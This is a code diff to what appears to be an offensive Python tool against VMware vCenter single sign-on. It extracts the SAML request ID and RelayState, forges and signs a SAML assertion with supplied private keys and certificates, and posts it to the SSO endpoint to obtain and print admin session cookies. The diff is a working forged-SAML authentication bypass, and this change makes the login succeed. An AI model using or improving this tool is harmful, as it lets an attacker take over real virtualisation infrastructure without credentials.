@@ -1282,6 +1282,7 @@ def get_vcenter_hostname(target: str) -> str:
 
 
 def get_saml_authn_request(target: str):
+    """Return (authn_id, relay_state) from vCenter's SSO initiation redirect."""
     import requests as req
     req.packages.urllib3.disable_warnings()
     try:
@@ -1289,16 +1290,19 @@ def get_saml_authn_request(target: str):
                     verify=False, timeout=10)
         if r.status_code == 302:
             loc = r.headers.get('location', '')
+            relay = urllib.parse.unquote(
+                re.search(r'RelayState=([^&]+)', loc).group(1)
+            ) if re.search(r'RelayState=([^&]+)', loc) else ''
             m = re.search(r'SAMLRequest=([^&]+)', loc)
             if m:
                 compressed = base64.b64decode(urllib.parse.unquote(m.group(1)))
                 xml_bytes  = zlib.decompress(compressed, -8)
                 etree = _need('lxml.etree', 'lxml')
                 root  = etree.fromstring(xml_bytes)
-                return root.get('ID', '_default')
+                return root.get('ID', '_default'), relay
     except Exception:
         pass
-    return '_default'
+    return '_default', ''
 
 
 def build_and_sign_saml(target: str, hostname: str, domain: str,
@@ -1332,16 +1336,19 @@ def build_and_sign_saml(target: str, hostname: str, domain: str,
     return etree.tostring(signed, xml_declaration=True, encoding='UTF-8', pretty_print=False)
 
 
-def saml_login(target: str, signed_xml: bytes) -> tuple:
+def saml_login(target: str, signed_xml: bytes, relay_state: str = '') -> tuple:
     import requests as req
     req.packages.urllib3.disable_warnings()
     s = req.Session()
     s.verify = False
+    post_data = {'SAMLResponse': base64.encodebytes(signed_xml)}
+    if relay_state:
+        post_data['RelayState'] = relay_state
     # Follow the redirect to /ui/ so the server sets all session cookies
     # (JSESSIONID in the 302 response; XSRF-TOKEN in the /ui/ 200 response)
     r = s.post(
         f'https://{target}/ui/saml/websso/sso',
-        data={'SAMLResponse': base64.encodebytes(signed_xml)},
+        data=post_data,
         allow_redirects=True,
         timeout=15,
     )
@@ -2024,11 +2031,11 @@ def main():
         if choice not in ('1', '2'):
             return
 
-        hostname  = get_vcenter_hostname(target)
-        authn_id  = get_saml_authn_request(target)
-        signed    = build_and_sign_saml(target, hostname, domain,
-                                        key_pem, cert1_pem, cert2_pem, authn_id)
-        cname, cval, ui_session = saml_login(target, signed)
+        hostname             = get_vcenter_hostname(target)
+        authn_id, relay_state = get_saml_authn_request(target)
+        signed               = build_and_sign_saml(target, hostname, domain,
+                                                    key_pem, cert1_pem, cert2_pem, authn_id)
+        cname, cval, ui_session = saml_login(target, signed, relay_state)
 
         print(f'\n[+] https://{target}/ui/')
         print(f'    {cname}={cval}')
